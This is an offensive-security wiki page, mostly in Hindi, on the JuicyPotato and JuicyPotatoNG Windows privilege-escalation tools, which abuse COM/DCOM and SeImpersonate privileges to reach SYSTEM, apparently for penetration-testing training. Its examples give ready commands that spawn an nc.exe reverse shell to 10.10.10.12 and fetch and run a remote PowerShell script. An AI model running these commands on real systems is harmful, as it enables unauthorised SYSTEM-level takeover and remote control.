# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato legacy है। यह आम तौर पर Windows 10 1803 / Windows Server 2016 तक के Windows versions पर काम करता है। Windows 10 1809 / Server 2019 से शुरू हुए Microsoft changes ने original technique को तोड़ दिया। इन builds और नए versions के लिए PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato और अन्य modern alternatives पर विचार करें। अद्यतन options और usage के लिए नीचे दिया गया page देखें।

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (golden privileges का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

[_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) का _एक sugared version_, जिसमें थोड़ा juice है, अर्थात **Windows Service Accounts से NT AUTHORITY\SYSTEM तक एक और Local Privilege Escalation tool**_<sup>[[1]](#references)</sup>

#### आप juicypotato को [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) से download कर सकते हैं

### Compatibility के quick notes

- जब current context में SeImpersonatePrivilege या SeAssignPrimaryTokenPrivilege हो, तो Windows 10 1803 और Windows Server 2016 तक reliably काम करता है।
- Windows 10 1809 / Windows Server 2019 और बाद के versions में Microsoft hardening के कारण broken है। इन builds के लिए ऊपर दिए गए alternatives को prefer करें।

### Summary <a href="#summary" id="summary"></a>

[**juicy-potato Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [variants](https://github.com/decoder-it/lonelypotato), [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) पर आधारित privilege escalation chain का उपयोग करते हैं, जिसमें MiTM listener `127.0.0.1:6666` पर होता है और आपके पास `SeImpersonate` या `SeAssignPrimaryToken` privileges होते हैं। Windows build review के दौरान हमें एक ऐसा setup मिला जिसमें `BITS` को जानबूझकर disabled किया गया था और port `6666` पहले से लिया जा चुका था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को weaponize करने का निर्णय लिया: **Juicy Potato का स्वागत है।**

> Theory के लिए [Rotten Potato - Service Accounts से SYSTEM तक Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) देखें और links तथा references की chain को follow करें।<sup>[[4]](#references)</sup>

`BITS` के अलावा, कई COM servers का abuse किया जा सकता है। उन्हें केवल यह करना आवश्यक है:

1. current user द्वारा instantiable होना, जो सामान्यतः एक “service user” होता है और जिसके पास impersonation privileges होते हैं
2. `IMarshal` interface को implement करना
3. एक elevated user (SYSTEM, Administrator, …) के रूप में run होना

कुछ testing के बाद हमने कई Windows versions पर [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) की एक extensive list प्राप्त की और test की।

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato आपको ये करने की अनुमति देता है:<sup>[[1]](#references)</sup>

- **Target CLSID** _अपनी पसंद का कोई भी CLSID चुनें।_ [_यहाँ_](http://ohpe.it/juicy-potato/CLSID/) _आपको OS के अनुसार organized list मिल सकती है।_
- **COM Listening port** _अपनी पसंद का COM listening port define करें (marshalled hardcoded 6666 के बजाय)_
- **COM Listening IP address** _server को किसी भी IP पर bind करें_
- **Process creation mode** _impersonated user के privileges के आधार पर आप इनमें से चुन सकते हैं:_
- `CreateProcessWithToken` (`SeImpersonate` आवश्यक)
- `CreateProcessAsUser` (`SeAssignPrimaryToken` आवश्यक)
- `both`
- **Process to launch** _exploitation सफल होने पर कोई executable या script launch करें_
- **Process Argument** _launched process के arguments customize करें_
- **RPC Server address** _stealthy approach के लिए आप किसी external RPC server से authenticate कर सकते हैं_
- **RPC Server port** _यदि आप किसी external server से authenticate करना चाहते हैं और firewall port `135` को block कर रहा है, तो उपयोगी है…_
- **TEST mode** _मुख्य रूप से testing purposes के लिए, अर्थात CLSIDs की testing के लिए। यह DCOM create करता है और token के user को print करता है। Testing के लिए_ [_यहाँ देखें_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

यदि user के पास `SeImpersonate` या `SeAssignPrimaryToken` privileges हैं, तो आप **SYSTEM** हैं।

इन सभी COM Servers के दुरुपयोग को रोकना लगभग असंभव है। आप `DCOMCNFG` के माध्यम से इन objects की permissions को संशोधित करने के बारे में सोच सकते हैं, लेकिन शुभकामनाएँ—यह चुनौतीपूर्ण होगा।

वास्तविक समाधान उन sensitive accounts और applications को protect करना है जो `* SERVICE` accounts के अंतर्गत run होते हैं। `DCOM` को रोकने से निश्चित रूप से यह exploit रुक जाएगा, लेकिन underlying OS पर इसका गंभीर प्रभाव पड़ सकता है।

से: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG निम्नलिखित को combine करके modern Windows पर JuicyPotato-style local privilege escalation को फिर से introduce करता है:<sup>[[2]](#references)</sup>
- चुने गए port पर local RPC server के लिए DCOM OXID resolution, जिससे पुराने hardcoded 127.0.0.1:6666 listener से बचा जा सके।
- inbound SYSTEM authentication को capture और impersonate करने के लिए SSPI hook, जिसके लिए RpcImpersonateClient की आवश्यकता नहीं होती। इससे केवल SeAssignPrimaryTokenPrivilege मौजूद होने पर भी CreateProcessAsUser enable होता है।
- DCOM activation constraints को satisfy करने के लिए tricks (जैसे PrintNotify / ActiveX Installer Service classes को target करते समय former INTERACTIVE-group requirement)।

महत्वपूर्ण notes (विभिन्न builds में behavior बदल सकता है):<sup>[[2]](#references)</sup>
- सितंबर 2022: Initial technique ने “INTERACTIVE trick” का उपयोग करके supported Windows 10/11 और Server targets पर काम किया।
- जनवरी 2023 में authors का update: Microsoft ने बाद में INTERACTIVE trick को block कर दिया। एक अलग CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) exploitation को restore करता है, लेकिन उनके post के अनुसार केवल Windows 11 / Server 2022 पर।

Basic usage (help में अधिक flags):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
यदि आप Windows 10 1809 / Server 2019 को target कर रहे हैं, जहाँ classic JuicyPotato को patch किया गया है, तो ऊपर दिए गए linked alternatives (RoguePotato, PrintSpoofer, EfsPotato/GodPotato आदि) को प्राथमिकता दें। NG, build और service state के आधार पर situational हो सकता है।

## उदाहरण

नोट: आज़माने के लिए CLSIDs की सूची हेतु [इस पेज](https://ohpe.it/juicy-potato/CLSID/) पर जाएँ।

### एक nc.exe reverse shell प्राप्त करें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### नया CMD लॉन्च करें (यदि आपके पास RDP access है)

![Powershell rev - नया CMD लॉन्च करें (यदि आपके पास RDP access है): नया CMD लॉन्च करें (यदि आपके पास RDP access है)](<../../images/image (300).png>)

## CLSID Problems

अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला default CLSID **काम नहीं करता**, और exploit विफल हो जाता है। आमतौर पर, एक **working CLSID** खोजने के लिए कई attempts करने पड़ते हैं। किसी specific operating system के लिए आज़माने योग्य CLSIDs की list प्राप्त करने के लिए, इस page पर जाएँ:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID की जाँच**

सबसे पहले, आपको juicypotato.exe के अलावा कुछ executables की आवश्यकता होगी।

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) download करें और इसे अपने PS session में load करें, फिर [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) download और execute करें। यह script test करने के लिए possible CLSIDs की list बनाएगी।

इसके बाद [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) download करें (CLSID list और juicypotato executable का path बदलें) और इसे execute करें। यह हर CLSID को आज़माना शुरू करेगा, और **जब port number बदलता है, तो इसका अर्थ होगा कि CLSID काम कर गया**।

Working CLSIDs को **-c parameter** का उपयोग करके **check** करें।

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [JuicyPotato को दूसरा मौका देना: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Service Accounts से SYSTEM तक Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
